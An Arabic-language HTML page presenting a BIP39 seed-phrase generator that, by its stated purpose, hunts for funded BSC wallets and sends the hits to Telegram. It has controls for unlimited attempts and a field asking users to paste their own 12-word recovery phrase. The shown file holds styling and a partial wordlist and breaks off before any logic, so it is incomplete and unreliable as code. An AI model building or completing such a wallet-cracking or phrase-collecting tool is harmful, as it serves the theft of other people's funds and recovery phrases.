<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مولد عبارات BIP39 والبحث عن المحافظ النشطة - BSC</title>
    <style>
        /* تصميم واجهة المستخدم المتجاوبة */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%);
            min-height: 100vh;
            padding: 20px;
            direction: rtl;
            text-align: right;
        }

        .container {
            max-width: 360px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .header {
            background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            font-weight: 700;
        }

        .header p {
            font-size: 1.1rem;
            opacity: 0.9;
        }

        .main-content {
            padding: 40px;
        }

        .control-panel {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid #e9ecef;
        }

        .manual-check-panel {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid #e9ecef;
        }

        .manual-check-panel h3 {
            color: #495057;
            margin-bottom: 20px;
            font-size: 1.3rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .control-group {
            margin-bottom: 25px;
        }

        .control-group label {
            display: block;
            font-weight: 600;
            margin-bottom: 8px;
            color: #495057;
            font-size: 1rem;
        }

        .control-group input,
        .control-group select,
        .control-group textarea {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            font-size: 1rem;
            transition: all 0.3s ease;
            background: white;
        }

        .control-group input:focus,
        .control-group select:focus,
        .control-group textarea:focus {
            outline: none;
            border-color: #f39c12;
            box-shadow: 0 0 0 3px rgba(243, 156, 18, 0.1);
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 15px 0;
        }

        .checkbox-group input[type="checkbox"] {
            width: 20px;
            height: 20px;
        }

        .checkbox-group label {
            margin: 0;
            font-weight: 500;
            color: #495057;
        }

        .button-group {
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
            justify-content: center;
            margin-top: 30px;
        }

        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 10px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            min-width: 150px;
        }

        .btn-success {
            background: linear-gradient(135deg, #56ab2f 0%, #a8e6cf 100%);
            color: white;
        }

        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(86, 171, 47, 0.3);
        }

        .btn-danger {
            background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
            color: white;
        }

        .btn-danger:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 65, 108, 0.3);
        }

        .btn-secondary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }

        .btn-secondary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .btn-warning {
            background: linear-gradient(135deg, #ff9a00 0%, #ffcc00 100%);
            color: white;
        }

        .btn-warning:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(255, 154, 0, 0.3);
        }

        .btn-info {
            background: linear-gradient(135deg, #17a2b8 0%, #6fdaed 100%);
            color: white;
        }

        .btn-info:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(23, 162, 184, 0.3);
        }

        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
            box-shadow: none !important;
        }

        .status-panel {
            background: white;
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 25px;
            border: 1px solid #e9ecef;
        }

        .status-panel h3 {
            color: #495057;
            margin-bottom: 20px;
            font-size: 1.3rem;
        }

        .status-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }

        .status-card {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid #e9ecef;
        }

        .status-card .number {
            font-size: 2rem;
            font-weight: 700;
            color: #f39c12;
            margin-bottom: 5px;
        }

        .status-card .label {
            color: #6c757d;
            font-size: 0.9rem;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: #e9ecef;
            border-radius: 4px;
            overflow: hidden;
            margin: 15px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #f39c12 0%, #e67e22 100%);
            width: 0%;
            transition: width 0.3s ease;
        }

        .log-panel {
            background: #212529;
            color: #ffffff;
            border-radius: 15px;
            padding: 20px;
            margin-top: 25px;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            line-height: 1.4;
        }

        .log-entry {
            margin-bottom: 8px;
            padding: 5px 0;
            border-bottom: 1px solid #343a40;
        }

        .log-entry:last-child {
            border-bottom: none;
        }

        .log-timestamp {
            color: #6c757d;
            font-size: 0.8rem;
        }

        .log-success {
            color: #28a745;
        }

        .log-error {
            color: #dc3545;
        }

        .log-info {
            color: #17a2b8;
        }

        .log-warning {
            color: #ffc107;
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .alert {
            padding: 15px 20px;
            border-radius: 10px;
            margin: 15px 0;
            font-weight: 500;
        }

        .alert-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .alert-danger {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .alert-info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }

        .alert-warning {
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }

        .wallet-details {
            background: white;
            border-radius: 10px;
            padding: 20px;
            margin-top: 20px;
            border: 1px solid #e9ecef;
        }

        .wallet-details h4 {
            color: #495057;
            margin-bottom: 15px;
            font-size: 1.1rem;
        }

        .wallet-info {
            display: grid;
            grid-template-columns: 1fr;
            gap: 10px;
        }

        .wallet-info-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #f1f3f4;
        }

        .wallet-info-item:last-child {
            border-bottom: none;
        }

        .wallet-info-label {
            font-weight: 600;
            color: #495057;
        }

        .wallet-info-value {
            color: #6c757d;
            word-break: break-all;
            text-align: left;
        }

        .token-list {
            margin-top: 10px;
            max-height: 200px;
            overflow-y: auto;
        }

        .token-item {
            padding: 8px;
            margin-bottom: 5px;
            background: #f8f9fa;
            border-radius: 5px;
            border: 1px solid #e9ecef;
        }

        .token-name {
            font-weight: 600;
            color: #495057;
        }

        .token-symbol {
            color: #6c757d;
            font-size: 0.9rem;
        }

        /* قسم العرض المباشر للعبارات */
        .live-display {
            background: #e8f5e8;
            border-radius: 10px;
            padding: 15px;
            margin-top: 15px;
            border: 1px solid #c3e6cb;
        }

        .live-display h5 {
            color: #155724;
            margin-bottom: 10px;
            font-size: 1rem;
        }

        .current-phrase {
            background: white;
            padding: 10px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            border: 1px solid #dee2e6;
            margin-bottom: 10px;
        }

        .phrase-status {
            font-size: 0.9rem;
            font-weight: 500;
        }

        .phrase-status.checking {
            color: #856404;
        }

        .phrase-status.active {
            color: #155724;
        }

        .phrase-status.empty {
            color: #721c24;
        }

        /* تصميم متجاوب للهواتف المحمولة */
        @media (max-width: 768px) {
            body {
                padding: 10px;
            }
            
            .header h1 {
                font-size: 2rem;
            }
            
            .header p {
                font-size: 1rem;
            }
            
            .main-content {
                padding: 20px;
            }
            
            .control-panel, .manual-check-panel {
                padding: 20px;
            }
            
            .button-group {
                flex-direction: column;
            }
            
            .btn {
                width: 100%;
                min-width: auto;
            }
            
            .status-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 15px;
            }
            
            .status-card .number {
                font-size: 1.5rem;
            }
            
            .log-panel {
                font-size: 0.8rem;
                max-height: 200px;
            }
        }

        @media (max-width: 480px) {
            .header {
                padding: 20px;
            }
            
            .header h1 {
                font-size: 1.8rem;
            }
            
            .main-content {
                padding: 15px;
            }
            
            .control-panel, .manual-check-panel {
                padding: 15px;
            }
            
            .status-grid {
                grid-template-columns: 1fr;
            }
            
            .status-card {
                padding: 15px;
            }
        }

        .fade-in {
            animation: fadeIn 0.5s ease-in;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .log-panel::-webkit-scrollbar {
            width: 8px;
        }

        .log-panel::-webkit-scrollbar-track {
            background: #343a40;
            border-radius: 4px;
        }

        .log-panel::-webkit-scrollbar-thumb {
            background: #6c757d;
            border-radius: 4px;
        }

        .log-panel::-webkit-scrollbar-thumb:hover {
            background: #adb5bd;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔑 مولد عبارات BIP39</h1>
            <p>البحث عن المحافظ النشطة على BSC وإرسالها إلى Telegram</p>
        </div>

        <div class="main-content">
            <!-- قسم التحقق اليدوي من العبارات -->
            <div class="manual-check-panel">
                <h3>🔍 التحقق اليدوي من عبارة الاسترجاع</h3>
                <div class="control-group">
                    <label for="manualMnemonic">أدخل عبارة الاسترجاع (12 كلمة):</label>
                    <textarea id="manualMnemonic" rows="3" placeholder="أدخل عبارة الاسترجاع هنا (12 كلمة)"></textarea>
                </div>
                
                <div class="checkbox-group">
                    <input type="checkbox" id="manualCheckTokens" checked>
                    <label for="manualCheckTokens">البحث عن الرموز المميزة (BEP-20) بالإضافة إلى BNB</label>
                </div>
                
                <div class="button-group">
                    <button id="checkMnemonicBtn" class="btn btn-info">
                        <span>🔎 فحص العبارة</span>
                    </button>
                </div>
                
                <!-- قسم العرض المباشر للعبارات -->
                <div id="liveDisplay" class="live-display" style="display: none;">
                    <h5>🔄 العبارة الحالية قيد الفحص:</h5>
                    <div id="currentPhrase" class="current-phrase"></div>
                    <div id="phraseStatus" class="phrase-status"></div>
                </div>
                
                <div id="manualCheckResult" class="wallet-details" style="display: none;">
                    <!-- سيتم ملء هذا القسم بالنتائج -->
                </div>
            </div>

            <div class="control-panel">
                <div class="control-group">
                    <label for="searchSpeed">سرعة البحث (مللي ثانية بين كل عبارة):</label>
                    <input type="number" id="searchSpeed" value="3000" min="1000" max="10000" step="500">
                </div>

                <div class="control-group">
                    <label for="maxAttempts">الحد الأقصى للمحاولات (0 = لا نهاية):</label>
                    <input type="number" id="maxAttempts" value="0" min="0" max="10000">
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="checkTokens" checked>
                    <label for="checkTokens">البحث عن الرموز المميزة (BEP-20) بالإضافة إلى BNB</label>
                </div>

                <div class="button-group">
                    <button id="startBtn" class="btn btn-success">
                        <span>🚀 بدء البحث</span>
                    </button>
                    <button id="stopBtn" class="btn btn-danger" disabled>
                        <span>⏹️ إيقاف البحث</span>
                    </button>
                    <button id="testTelegramBtn" class="btn btn-secondary">
                        <span>📱 اختبار Telegram</span>
                    </button>
                    <button id="clearLogsBtn" class="btn btn-warning">
                        <span>🗑️ مسح السجل</span>
                    </button>
                </div>
            </div>

            <div class="status-panel">
                <h3>📊 إحصائيات العملية</h3>
                <div class="status-grid">
                    <div class="status-card">
                        <div class="number" id="totalGenerated">0</div>
                        <div class="label">إجمالي العبارات</div>
                    </div>
                    <div class="status-card">
                        <div class="number" id="activeWallets">0</div>
                        <div class="label">المحافظ النشطة</div>
                    </div>
                    <div class="status-card">
                        <div class="number" id="emptyWallets">0</div>
                        <div class="label">المحافظ الفارغة</div>
                    </div>
                    <div class="status-card">
                        <div class="number" id="errorCount">0</div>
                        <div class="label">الأخطاء</div>
                    </div>
                </div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <div id="currentStatus" class="alert alert-info">
                    جاهز للبدء...
                </div>
            </div>

            <div class="log-panel" id="logPanel">
                <div class="log-entry log-info">
                    <span class="log-timestamp">[${new Date().toLocaleTimeString('ar-EG')}]</span>
                    مرحباً بك في مولد عبارات BIP39 لشبكة BSC. اضغط على "بدء البحث" للبدء.
                </div>
            </div>
        </div>
    </div>

    <!-- تحميل مكتبة ethers.js -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

    <script>
        // قائمة كلمات BIP39 الإنجليزية الرسمية (مختصرة لأغراض العرض)
        const BIP39_WORDLIST = [
            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse",
            "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act",
            "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit",
            "adult", "advance", "advice", "aerobic", "affair", "affect", "afford", "afraid", "after", "again",
            "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album",
            "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already",
            "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor",
            "ancient", "anger", "angle", "angry", "animal", "announce", "annual", "another", "answer", "antenna",
            "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "area",
            "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive",
            "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist",
            "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit",
            "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware",
            "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon", "badge", "bag",
            "balance", "balcony", "ball", "bamboo", "banana", "banner", "bar", "barely", "bargain", "barrel",
            "base", "basic", "basket", "battle", "beach", "bean", "beauty", "because", "become", "beef",
            "before", "begin", "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best",
            "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind", "biology", "bird",
            "birth", "bitter", "black", "blade", "blame", "blanket", "blast", "bleak", "bless", "blind",
            "blood", "blossom", "blouse", "blue", "blur", "blush", "board", "boat", "body", "boil",
            "bomb", "bone", "bonus", "book", "boost", "border", "boring", "borrow", "boss", "bottom",
            "bounce", "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze",
            "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken", "bronze", "broom",
            "brother", "brown", "brush", "bubble", "buddy", "budget", "buffalo", "build", "bulb", "bulk",
            "bullet", "bundle", "bunker", "burden", "burger", "burst", "bus", "business", "busy", "butter",
            "buyer", "buzz", "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm",
            "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe", "canvas", "canyon",
            "capable", "capital", "captain", "car", "carbon", "card", "cargo", "carpet", "carry", "cart",
            "case", "cash", "casino", "castle", "casual", "cat", "catalog", "catch", "category", "cattle",
            "caught", "cause", "caution", "cave", "ceiling", "celery", "cement", "census", "century", "ceremony",
            "certain", "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase", "chat",
            "cheap", "check", "cheek", "cheese", "chef", "cherry", "chest", "chicken", "chief", "child",
            "chimney", "choice", "choose", "chronic", "chuckle", "chunk", "churn", "cigar", "cinnamon", "circle",
            "citizen", "city", "civil", "claim", "clap", "clarify", "claw", "clay", "clean", "clerk",
            "clever", "click", "client", "cliff", "climb", "clinic", "clip", "clock", "clog", "close",
            "cloth", "cloud", "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut",
            "code", "coffee", "coil", "coin", "collect", "color", "column", "combine", "come", "comfort",
            "comic", "common", "company", "concert", "conduct", "confirm", "congress", "connect", "consider", "control",
            "convince", "cook", "cool", "copper", "copy", "coral", "core", "corn", "correct", "cost",
            "cotton", "couch", "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle",
            "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit", "creek",
            "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch", "crowd", "crucial",
            "cruel", "cruise", "crumble", "crunch", "crush", "cry", "crystal", "cube", "culture", "cup",
            "cupboard", "curious", "current", "curtain", "curve", "cushion", "custom", "cute", "cycle", "dad",
            "damage", "damp", "dance", "danger", "daring", "dark", "dash", "date", "daughter", "dawn",
            "day", "deal", "debate", "debris", "decade", "december", "decide", "decline", "decorate", "decrease",
            "deer", "defense", "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial",
            "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive", "describe", "desert",
            "design", "desk", "despair", "destroy", "detail", "detect", "develop", "device", "devote", "diagram",
            "dial", "diamond", "diary", "dice", "diesel", "diet", "differ", "digital", "dignity", "dilemma",
            "dinner", "dinosaur", "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder",
            "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document", "dog", "doll",
            "dolphin", "domain", "donate", "donkey", "donor", "door", "dose", "double", "dove", "draft",
            "dragon", "drama", "drastic", "draw", "dream", "dress", "drift", "drill", "drink", "drip",
            "drive", "drop", "drum", "dry", "duck", "dumb", "dune", "during", "dust", "dutch",
            "duty", "dwarf", "dynamic", "eager", "eagle", "early", "earn", "earth", "easily", "east",
            "easy", "echo", "ecology", "economy", "edge", "edit", "educate", "effort", "egg", "eight",
            "either", "elbow", "elder", "electric", "elegant", "element", "elephant", "elevator", "elite", "else",
            "embark", "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable", "enact",
            "end", "endless", "endorse", "enemy", "energy", "enforce", "engage", "engine", "enhance", "enjoy",
            "enlist", "enough", "enrich", "enroll", "ensure", "enter", "entire", "entry", "envelope", "episode",
            "equal", "equip", "era", "erase", "erode", "erosion", "error", "erupt", "escape", "essay",
            "essence", "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact", "example",
            "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise", "exhaust", "exhibit", "exile",
            "exist", "exit", "exotic", "expand", "expect", "expire", "explain", "expose", "express", "extend",
            "extra", "eye", "eyebrow", "fabric", "face", "faculty", "fade", "faint", "faith", "fall",
            "false", "fame", "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat",
            "fatal", "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee", "feed",
            "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber", "fiction", "field",
            "figure", "file", "film", "filter", "final", "find", "fine", "finger", "finish", "fire",
            "firm", "first", "fiscal", "fish", "fit", "fitness", "fix", "flag", "flame", "flash",
            "flat", "flavor", "flee", "flight", "flip", "float", "flock", "floor", "flower", "fluid",
            "flush", "fly", "foam", "focus", "fog", "foil", "fold", "follow", "food", "foot",
            "force", "foreign", "forest", "forget", "fork", "fortune", "forum", "forward", "fossil", "foster",
            "found", "fox", "fragile", "frame", "frequent", "fresh", "friend", "fringe", "frog", "front",
            "frost", "frown", "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future",
            "gadget", "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic",
            "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius", "genre",
            "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle", "ginger", "giraffe", "girl",
            "give", "glad", "glance", "glare", "glass", "glide", "glimpse", "globe", "gloom", "glory",
            "glove", "glow", "glue", "goat", "goddess", "gold", "good", "goose", "gorilla", "gospel",
            "gossip", "govern", "gown", "grab", "grace", "grain", "grant", "grape", "grass", "gravity",
            "great", "green", "grid", "grief", "grit", "grocery", "group", "grow", "grunt", "guard",
            "guess", "guide", "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer",
            "hamster", "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk",
            "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello", "helmet", "help",
            "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire", "history", "hobby",
            "hockey", "hold", "hole", "holiday", "hollow", "home", "honey", "hood", "hope", "horn",
            "horror", "horse", "hospital", "host", "hotel", "hour", "hover", "hub", "huge", "human",
            "humble", "humor", "hundred", "hungry", "hunt", "hurdle", "hurry", "hurt", "husband", "hybrid",
            "ice", "icon", "idea", "identify", "idle", "ignore", "ill", "illegal", "illness", "image",
            "imitate", "immense", "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income",
            "increase", "index", "indicate", "indoor", "industry", "infant", "inflict", "inform", "inhale", "inherit",
            "initial", "inject", "injury", "inmate", "inner", "innocent", "input", "inquiry", "insane", "insect",
            "inside", "inspire", "install", "intact", "interest", "into", "invest", "invite", "involve", "iron",
            "island", "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous",
            "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge", "juice",
            "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep", "ketchup", "key",
            "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit", "kitchen", "kite", "kitten",
            "kiwi", "knee", "knife", "knock", "know", "lab", "label", "labor", "ladder", "lady",
            "lake", "lamp", "language", "laptop", "large", "later", "latin", "laugh", "laundry", "lava",
            "law", "lawn", "lawsuit", "layer", "lazy", "leader", "leaf", "learn", "leave", "lecture",
            "left", "leg", "legal", "legend", "leisure", "lemon", "lend", "length", "lens", "leopard",
            "lesson", "letter", "level", "liar", "liberty", "library", "license", "life", "lift", "light",
            "like", "limb", "limit", "link", "lion", "liquid", "list", "little", "live", "lizard",
            "load", "loan", "lobster", "local", "lock", "logic", "lonely", "long", "loop", "lottery",
            "loud", "lounge", "love", "loyal", "lucky", "luggage", "lumber", "lunar", "lunch", "luxury",
            "lying", "machine", "mad", "magic", "magnet", "maid", "mail", "main", "major", "make",
            "mammal", "man", "manage", "mandate", "mango", "mansion", "manual", "maple", "marble", "march",
            "margin", "marine", "market", "marriage", "mask", "mass", "master", "match", "material", "math",
            "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure", "meat", "mechanic", "medal",
            "media", "melody", "melt", "member", "memory", "mention", "menu", "mercy", "merge", "merit",
            "merry", "mesh", "message", "metal", "method", "middle", "midnight", "milk", "million", "mimic",
            "mind", "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake", "mix",
            "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor", "monkey", "monster",
            "month", "moon", "moral", "more", "morning", "mosquito", "mother", "motion", "motor", "mountain",
            "mouse", "move", "movie", "much", "muffin", "mule", "multiply", "muscle", "museum", "mushroom",
            "music", "must", "mutual", "myself", "mystery", "myth", "naive", "name", "napkin", "narrow",
            "nasty", "nation", "nature", "near", "neck", "need", "needle", "neglect", "neighbor", "neither",
            "nephew", "nerve", "nest", "net", "network", "neutral", "never", "news", "next", "nice",
            "night", "noble", "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note",
            "nothing", "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey",
            "object", "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor",
            "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit",
            "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option",
            "orange", "orbit", "order", "ordinary", "organ", "orient", "original", "orphan", "ostrich", "other",
            "outdoor", "outer", "output", "outside", "oval", "oven", "over", "own", "owner", "oxygen",
            "oyster", "ozone", "pact", "paddle", "page", "pair", "palace", "palm", "panda", "panel",
            "panic", "panther", "paper", "parade", "parent", "park", "parrot", "part", "pass", "patch",
            "path", "patient", "patrol", "pattern", "pause", "pave", "payment", "peace", "peanut", "pear",
            "peasant", "pelican", "pen", "penalty", "pencil", "people", "pepper", "perfect", "permit", "person",
            "pet", "phone", "photo", "phrase", "physical", "piano", "picnic", "picture", "piece", "pig",
            "pigeon", "pill", "pilot", "pink", "pioneer", "pipe", "pistol", "pitch", "pizza", "place",
            "planet", "plastic", "plate", "play", "please", "pledge", "pluck", "plug", "plunge", "poem",
            "poet", "point", "polar", "pole", "police", "pond", "pony", "pool", "popular", "portion",
            "position", "possible", "post", "potato", "pottery", "poverty", "powder", "power", "practice", "praise",
            "predict", "prefer", "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print",
            "priority", "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project",
            "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding", "pull",
            "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose", "purse",
            "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick", "quiet",
            "quilt", "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio",
            "rail", "rain", "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare",
            "rate", "rather", "raven", "raw", "razor", "ready", "real", "reason", "rebel", "rebuild",
            "recall", "receive", "recipe", "record", "recycle", "reduce", "reflect", "reform", "refuse", "region",
            "regret", "regular", "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind",
            "remove", "render", "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require",
            "rescue", "resemble", "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion",
            "reveal", "review", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge",
            "rifle", "right", "rigid", "ring", "riot", "ripple", "rise", "risk", "ritual", "rival",
            "river", "road", "roast", "rob", "robot", "robust", "rocket", "romance", "roof", "rookie",
            "room", "rose", "rotate", "rough", "round", "route", "royal", "rubber", "rude", "rug",
            "rule", "run", "runway", "rural", "sad", "saddle", "sadness", "safe", "sail", "salad",
            "salmon", "salon", "salt", "salute", "same", "sample", "sand", "satisfy", "satoshi", "sauce",
            "sausage", "save", "say", "scale", "scan", "scare", "scatter", "scene", "scheme", "school",
            "science", "scissors", "scorpion", "scout", "scrap", "screen", "script", "scrub", "sea", "search",
            "season", "seat", "second", "secret", "section", "security", "seed", "seek", "segment", "select",
            "sell", "seminar", "senior", "sense", "sentence", "series", "service", "session", "settle", "setup",
            "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff", "shield", "shift",
            "shine", "ship", "shirt", "shock", "shoe", "shoot", "shop", "short", "shoulder", "shove",
            "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign",
            "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister",
            "situate", "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull",
            "slab", "slam", "sleep", "slender", "slice", "slide", "slight", "slim", "slogan", "slot",
            "slow", "slush", "small", "smart", "smile", "smoke", "smooth", "snack", "snake", "snap",
            "sniff", "snow", "soap", "soccer", "social", "sock", "soda", "soft", "solar", "sold",
            "soldier", "solid", "solution", "solve", "someone", "song", "soon", "sorry", "sort", "soul",
            "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn", "speak", "special",
            "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit", "split",
            "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square",
            "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start",
            "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting",
            "stock", "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong",
            "struggle", "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such",
            "sudden", "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super",
            "supply", "support", "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain",
            "swallow", "swamp", "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch",
            "sword", "symbol", "symptom", "syrup", "system", "table", "tackle", "tag", "tail", "talent",
            "talk", "tank", "tape", "target", "task", "taste", "tattoo", "taxi", "teach", "team",
            "tell", "ten", "tenant", "tennis", "tent", "term", "test", "text", "thank", "that",
            "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three", "thrive",
            "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny",
            "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together",
            "toilet", "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top",
            "topic", "topple", "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower",
            "town", "toy", "track", "trade", "traffic", "tragic", "train", "transfer", "trap", "trash",
            "travel", "tray", "treat", "tree", "trend", "trial", "tribe", "trick", "trigger", "trim",
            "trip", "trophy", "trouble", "truck", "true", "truly", "trumpet", "trust", "truth", "try",
            "tube", "tuition", "tumble", "tuna", "tunnel", "turkey", "turn", "turtle", "twelve", "twenty",
            "twice", "twin", "twist", "two", "type", "typical", "ugly", "umbrella", "unable", "unaware",
            "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy", "uniform", "unique", "unit",
            "universe", "unknown", "unlock", "until", "unusual", "unveil", "update", "upgrade", "uphold", "upon",
